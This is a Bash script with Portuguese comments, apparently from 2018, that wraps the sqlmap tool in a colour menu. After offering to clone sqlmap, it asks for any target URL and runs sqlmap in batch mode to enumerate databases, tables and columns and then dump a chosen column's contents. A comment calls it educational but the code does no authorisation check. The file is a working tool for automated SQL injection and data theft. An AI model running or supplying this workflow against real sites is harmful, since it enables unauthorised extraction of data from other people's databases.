#! /bin/bash
#Script Coded By: Bob ( Maryen Security )
#Creditos: Bob/LORD
#Script para pentesters (uso educacional ou testes)
#Não me responsabilizo por mal uso !
#
#
#
#
#Limpar tudo acima...
clear
#
#BANNER
echo "##########################################"
echo "#   SCRIPT PARA SQLMAP AUTOMATICO        #"
echo "#                                        #"
echo "#  Coded by:LORD  Repostado por: LORD    #"
echo "#               2018                     #"
echo "##########################################"

#Menu
echo "\n\n====================================="
echo "=                                   ="
echo "=     \033[1;34m[\033[1;31m1]>> \033[1;33mInstalar SQLMAP  \033[1;36m       ="
echo "=     \033[1;34m[\033[1;31m2]>> \033[1;33mUsar Sql-Automatico  \033[1;36m   ="
echo "=                                   ="
echo "====================================="
#
#Escolher entre 1 ou 2
#obrigado por usar 
read -p "[+]>> " opcao
#
#Instala sqlmap
if [ "$opcao" = "1" ];then
echo "\n\n\033[1;33mInstalando sqlmap ...";sleep 2
git clone https://github.com/sqlmapproject/sqlmap
echo "\n\033[1;36mSqlmap instalado com sucesso !";sleep 2
fi
#
#Incia o sqlmap automatico
if [ "$opcao" = "2" ];then
clear
#
#Abre a pasta do sqlmap
cd $HOME ; cd sqlmap
#
#Complemento do incio...
echo "\033[1;32m\n\n[+]=> INICIANDO SQLMAP AUTOMATICO...";sleep 2
#
#Read para digitar a url
echo "\033[1;36m\n[+]=> DIGITE A URL PARA O SQLMAP\033[1;31m"
read -p "[+]=> " url
#
#Começa a listar as databases
python2 sqlmap.py -u $url --risk 2 --level 2 --batch --dbs
#
#Read para digitar o nome da database listada
echo "\033[1;36m[+]=> DIGITE O NOME DA >DATABASE<\033[1;31m"
read -p "[+]=> " db
#
#Começa a listar as tabelas
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db --tables
#
#Read para digitar o nome da tabela
echo "\033[1;36m[+]=> DIGITE O NOME DA TABELA\033[1;31m"
read -p "[+]=> " tabela
#
#Começa a listar as colunas
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela --columns
#
#Read para digitar o nome da coluna
echo "\033[1;36m[+]=> DIGITE O NOME DA COLUNA\033[1;31m"
read -p "[+]=> " coluna
#
#Extrai todo o trabalho feito
python2 sqlmap.py -u $url --risk 2 --level 2 --batch -D $db -T $tabela -C $coluna --dump
#CONCLUIDO !
fi
